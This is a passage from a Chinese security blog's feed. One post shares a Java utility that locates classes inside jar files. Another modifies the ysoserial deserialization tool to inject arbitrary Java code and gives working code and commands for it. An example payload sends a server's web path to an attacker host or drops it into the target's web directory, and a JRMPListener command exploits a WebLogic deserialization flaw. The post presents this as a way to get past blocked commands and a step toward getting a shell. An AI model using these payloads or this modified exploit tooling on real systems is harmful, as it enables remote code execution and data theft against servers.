    <content type="html"><![CDATA[<p>标题主要是针对安全人员，如果针对是开发人员的话，应该是 <strong>如何快速从众多jar中找到目标类？</strong></p><p>在编写Java相关中间件或者CMS的POC/EXP时一般都会依赖它们的某个jar，但它们的jar往往非常多，并且会分散在各个目录下，那么如何快速找到它们呢？</p><h2 id="0x01-之前的方案"><a href="#0x01-之前的方案" class="headerlink" title="0x01 之前的方案"></a>0x01 之前的方案</h2><p>以前我的方法是把所有的jar复制到一个目录下，然后把它们导入到IDEA中，最后使用IDEA搜索。例如最近在写的一个Weblogic漏洞的POC，编译时提示找不到<code>weblogic.work.ExecuteThread</code>,这时就可以使用该方法搜索到它在<code>wlthin3client.jar</code>中，然后将其引入问题解决。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbyIDEA.png" alt="通过IDEA搜索"></p><p>不过细想，需要以下步骤：</p><ol><li>新建目录</li><li>复制所有jar到目录下</li><li>打开IDEA</li><li>将所有jar导入IDEA</li><li>在IDEA中搜索目标类 </li></ol><p>这还是稍微有点繁琐了，那能不能更加轻便快速地找到我们需要的类呢？下面通过编程来优雅地给大家省几秒钟。</p><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>我们要实现的是需提供<code>类名</code>，和<code>jar所在目录</code>就可搜索的小工具，它支持完整类名搜索，也支持通配符。具体如何实现，请参考我代码中的注释和提供的参考文章链接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.searchclassinjar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipFile;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: c0ny1</span></span><br><span class="line"><span class="comment"> * date: 2019-05-13 23:51:42</span></span><br><span class="line"><span class="comment"> * description: 快速从众多jar中，搜索目标class所在的jar。不区分大小写，支持通配符搜索。</span></span><br><span class="line"><span class="comment"> * reference：</span></span><br><span class="line"><span class="comment"> *  1.https://jdkleo.iteye.com/blog/2392642</span></span><br><span class="line"><span class="comment"> *  2.https://lihong11.iteye.com/blog/1936694</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchClassInJar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String jarDir;</span><br><span class="line">    <span class="keyword">private</span> Integer totalNum =  <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SearchClassInJar</span><span class="params">(String className,String jarDir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.jarDir = jarDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jar中的类文件路径形式改为包路径形式</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">getClassName</span><span class="params">(ZipEntry entry)</span> </span>&#123;</span><br><span class="line">        StringBuffer className = <span class="keyword">new</span> StringBuffer(entry.getName().replace(<span class="string">'/'</span>,<span class="string">'.'</span>));</span><br><span class="line">        <span class="keyword">return</span> className.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从jar从搜索目标类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">searchClass</span><span class="params">(<span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        searchDir(<span class="keyword">this</span>.jarDir, recurse);</span><br><span class="line">        System.out.println(String.format(<span class="string">"[!] Find %s classes"</span>,<span class="keyword">this</span>.totalNum));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//递归搜索目录和子目录下所有jar和zip文件</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">searchDir</span><span class="params">(String dir, <span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File d = <span class="keyword">new</span> File(dir);</span><br><span class="line">            <span class="keyword">if</span> (!d.isDirectory()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            File[] files = d.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (recurse &amp;&amp; files[i].isDirectory()) &#123;</span><br><span class="line">                    searchDir(files[i].getAbsolutePath(), <span class="keyword">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String filename = files[i].getAbsolutePath();</span><br><span class="line">                    <span class="keyword">if</span> (filename.endsWith(<span class="string">".jar"</span>)||filename.endsWith(<span class="string">".zip"</span>)) &#123;</span><br><span class="line">                        ZipFile zip = <span class="keyword">new</span> ZipFile(filename);</span><br><span class="line">                        Enumeration entries = zip.entries();</span><br><span class="line">                        <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">                            ZipEntry entry = (ZipEntry) entries.nextElement();</span><br><span class="line">                            String thisClassName = getClassName(entry);</span><br><span class="line">                            <span class="keyword">if</span> (wildcardEquals(<span class="keyword">this</span>.className.toLowerCase(),thisClassName.toLowerCase()) || wildcardEquals(<span class="keyword">this</span>.className.toLowerCase() + <span class="string">".class"</span>,thisClassName.toLowerCase())) &#123;</span><br><span class="line">                                String res = String.format(<span class="string">"[+] %s | %s"</span>,thisClassName,filename);</span><br><span class="line">                                System.out.println(res);</span><br><span class="line">                                totalNum++;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通配符匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">wildcardEquals</span><span class="params">(String wildcard, String str)</span> </span>&#123;</span><br><span class="line">        String regRule = WildcardToReg(wildcard);</span><br><span class="line">        <span class="keyword">return</span> Pattern.compile(regRule).matcher(str).matches();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将通配符转换为正则表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">WildcardToReg</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = path.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> len = chars.length;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">boolean</span> preX = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == <span class="string">'*'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">".*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i+<span class="number">1</span> == len)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    preX = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (chars[i] == <span class="string">'?'</span>)&#123;</span><br><span class="line">                    sb.append(<span class="string">'.'</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    sb.append(chars[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"SearchClassInJar v0.1"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Autor：c0ny1&lt;root@gv7.me&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Usage：java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Example：java -jar SearchClassInJar.jar weblogic.work.ExecuteThread C:\\weblogic"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SearchClassInJar scij = <span class="keyword">new</span> SearchClassInJar(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        scij.searchClass(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;</span><br></pre></td></tr></table></figure><p>PS：大家可自行编译，若需要我编译好的，请公众号后台回复<code>SearchClassInJar</code>获取下载地址!</p><h2 id="0x03-演示效果"><a href="#0x03-演示效果" class="headerlink" title="0x03 演示效果"></a>0x03 演示效果</h2><p>我们还是来找Weblogic下<code>weblogic.work.ExecuteThread</code>类所在的jar。命令行下运行我们写好的程序，指定要搜索的类名和weblogic安装目录即可。可以有以下三种方式搜索。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbycode.png" alt="演示效果"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://jdkleo.iteye.com/blog/2392642" target="_blank" rel="noopener">java实现路径通配符<em>,*</em>,?</a></li><li><a href="https://lihong11.iteye.com/blog/1936694" target="_blank" rel="noopener">查找某个类所在jar包</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标题主要是针对安全人员，如果针对是开发人员的话，应该是 &lt;strong&gt;如何快速从众多jar中找到目标类？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在编写Java相关中间件或者CMS的POC/EXP时一般都会依赖它们的某个jar，但它们的jar往往非常多，并且会分散在各个目录下，那
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>使ysoserial支持执行自定义代码</title>
    <link href="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"/>
    <id>http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/</id>
    <published>2019-05-09T21:00:41.000Z</published>
    <updated>2019-05-12T14:22:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。</p><a id="more"></a><h2 id="0x01-意义"><a href="#0x01-意义" class="headerlink" title="0x01 意义"></a>0x01 意义</h2><p><strong>一、绕过检测，执行某些禁止命令。</strong></p><p>有些系统做了防护，不许执行或者没有某些命令（比如wget）。这时可以编写命令同等功能的代码，来绕过限制。</p><p><strong>二、解决各个平台命令不一致。</strong></p><p>不同操作系统，命令会有不同。比如查看ip操作，Windows是ipconfig，Linux是ifconfg。而java代码是可以跨平台的。</p><p><strong>三、获取更高的自由度，实现更复杂的操作。</strong></p><p>命令的背后也是代码，当需要执行一些比较复杂的操作时，纯命令是很难实现的，但代码可以！</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>在<code>ysoserial/payloads/util/Gadgets.java</code>中的代码注释，作者提到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections（待做，可以做一些有趣的事情比如注入一个纯java的反弹或绑定shell去绕过较弱的保护）</span><br></pre></td></tr></table></figure><p>可知作者也有此意，并给我们预留了可指定自定义代码的变量<code>cmd</code>。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png" alt="作者的注释"></p><p>我们从控制台传入的命令，会被保存到<code>command</code>变量中，最后ysoserial会将该变量的值,拼接到<code>&quot;Runtime.getRuntime.exec(&quot; + 命令 + &quot;)&quot;</code>中，生成形成达到命令执行的代码，所以本质上还是代码执行。</p><p><strong>因此要想使ysoserial支持执行自定义代码，只要使得在控制台输入能控制cmd变量的值即可。实现起来并不难</strong></p><h2 id="0x03-编码"><a href="#0x03-编码" class="headerlink" title="0x03 编码"></a>0x03 编码</h2><p>根据我个人的的需要，给ysoserial加入以下三种方式来指定要执行的自定义代码。</p><table><thead><tr><th align="center">序号</th><th align="left">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">“code:代码内容”</td><td align="left">代码量比较少时采用</td></tr><tr><td align="center">2</td><td align="left">“codebase64:代码内容base64编码”</td><td align="left">防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td></tr><tr><td align="center">3</td><td align="left">“codefile:代码文件路径”</td><td align="left">代码量比较多时采用</td></tr></tbody></table><p><strong>注意：如果没有指定以上开头，就默认当命令处理。</strong></p><p>基于上面的需求，我修改了<code>createTemplatesImpl()</code>函数的代码为如下，具体如何实现，请参考代码和注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Code by c0ny1</span></span><br><span class="line">    <span class="comment">// email: root@gv7.me</span></span><br><span class="line">    <span class="comment">// date: 2019-04-29</span></span><br><span class="line">    <span class="comment">// From: https://www.cnblogs.com/0201zcr/p/5009975.html</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    String cmd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(command.startsWith(<span class="string">"code:"</span>)) &#123;</span><br><span class="line">        cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codebase64:"</span>))&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">        cmd = <span class="keyword">new</span> String(decode);</span><br><span class="line">        cmd = <span class="keyword">new</span> URLDecoder().decode(cmd);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codefile:"</span>))&#123;</span><br><span class="line">        String codefile = command.substring(<span class="number">9</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(codefile);</span><br><span class="line">            <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">                FileReader reader = <span class="keyword">new</span> FileReader(file);</span><br><span class="line">                BufferedReader br = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">                String line = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(line);</span><br><span class="line">                    sb.append(<span class="string">"\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmd = sb.toString();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.err.println(String.format(<span class="string">"[-] %s is not exists!"</span>,codefile));</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">            command.replaceAll(<span class="string">"\\\\"</span>, <span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">            <span class="string">"\");"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.err.println(<span class="string">"----------------------------------Java code start----------------------------------"</span>);</span><br><span class="line">    System.err.println(cmd);</span><br><span class="line">    System.err.println(<span class="string">"-----------------------------------Java code end-----------------------------------"</span>);</span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完代码后，我们重新将其打包为ysoserial-0.0.6.1-custom-code-exec.jar，就可以使用可指定自定义代码的ysoserial了。需要我编译好的jar，请公众号后台回复“ysoserial可指定任意代码版本”获取。</p><p>注意:只有以下payload支持指定支持任意代码执行，其他paylaod需要手工修改其代码，因为它们没有调用我们修改的<code>Gadgets.createTemplatesImpl</code>方法。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/call.png" alt="调用了createTemplatesImpl方法的payload"></p><h2 id="0x04-案例"><a href="#0x04-案例" class="headerlink" title="0x04 案例"></a>0x04 案例</h2><p>下面举一个“不痛不痒”的例子，来展现其高自由度。</p><p>假设我们有个需求是这样的，获取目标系统的web物理路径，如果目标能访问我们服务器就把信息提交到服务器的web服务上。如果不能，就把信息写到目标自己的web目录下。如果你使用命令在实现，是比较费劲的，但是用代码就轻而易举！</p><p><strong>custiom-code.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">String HOST = <span class="string">"http://192.168.149.1:1665"</span>;</span><br><span class="line">String WEB_PATH = System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line"></span><br><span class="line">String str_url = HOST + <span class="string">"/?info="</span> + WEB_PATH;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//若目标能访问我们的服务器，则发送信息到服务器上</span></span><br><span class="line">    java.net.URL url = <span class="keyword">new</span> java.net.URL(str_url);</span><br><span class="line">    java.net.URLConnection conn = url.openConnection();</span><br><span class="line">    conn.connect();</span><br><span class="line">    conn.getContent();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">//若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中</span></span><br><span class="line">    String webPath = WEB_PATH + <span class="string">"/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.FileOutputStream f1 = <span class="keyword">new</span> java.io.FileOutputStream(webPath);</span><br><span class="line">        f1.write(WEB_PATH.getBytes());</span><br><span class="line">        f1.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我利用CNVD-C-2019-48814这个漏洞，让远程服务器（192.168.149.142）加载我本机rmi服务（192.168.149.1:1664），我的rmi服务指定执行的代码，是我们编写好的custom-code.java。具体命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6.1-custom-code-exec.jar ysoserial.exploit.JRMPListener 1664 Jdk7u21 &quot;codefile:custom-code.java&quot;</span><br></pre></td></tr></table></figure><p>通过测试发现，在本机启动web服务（92.168.149.1:1665），且目标可访问时，可成功接收信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/server_info.png" alt="服务器成功接收到信息"></p><p>然后我把服务器web服务停止了，目标自然无法访问。结果在目标系统的web目录下成功生成了文件，保存着我们要采集的信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/txt_info.png" alt="目标web目录下成功生成包含信息的文件"></p><p>从任意命令执行变成任意代码执行，在我看来危害增大了不少。在命令执行getshell受阻时，如何通过代码执行突破呢，到这里懂的人自然懂了。</p><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://blog.csdn.net/fnmsd/article/details/79534877" target="_blank" rel="noopener">修改ysoserial使其支持生成代码执行Payload</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>编写油猴脚本，实现自动登录下载Oracle产品</title>
    <link href="http://gv7.me/articles/2019/oracle-download-auto-login-tampermonkey-script/"/>
    <id>http://gv7.me/articles/2019/oracle-download-auto-login-tampermonkey-script/</id>
